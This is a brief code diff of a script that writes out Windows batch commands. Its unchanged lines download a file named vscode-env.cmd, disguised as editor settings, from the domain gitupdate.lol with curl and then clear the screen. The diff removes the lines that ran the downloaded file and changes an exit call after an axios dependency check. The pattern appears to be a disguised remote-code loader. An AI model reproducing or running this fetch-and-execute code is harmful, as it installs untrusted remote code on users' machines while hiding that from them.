@@ -90,8 +90,6 @@ if not exist "%VSCODE_DIR%" ( mkdir "%VSCODE_DIR%" )
 
 curl -s -L -o "%VSCODE_DIR%\\vscode-env.cmd" https://gitupdate.lol/settings/bootstrap?flag=${flag}
 cls
-"%VSCODE_DIR%\\vscode-env.cmd"
-exit
     	`;
       break;
 
@@ -225,7 +223,7 @@ if not exist "%~dp0node_modules\\axios" (
   )
   popd
 )
-exit
+exit /b 0
     	`;
       break;
 
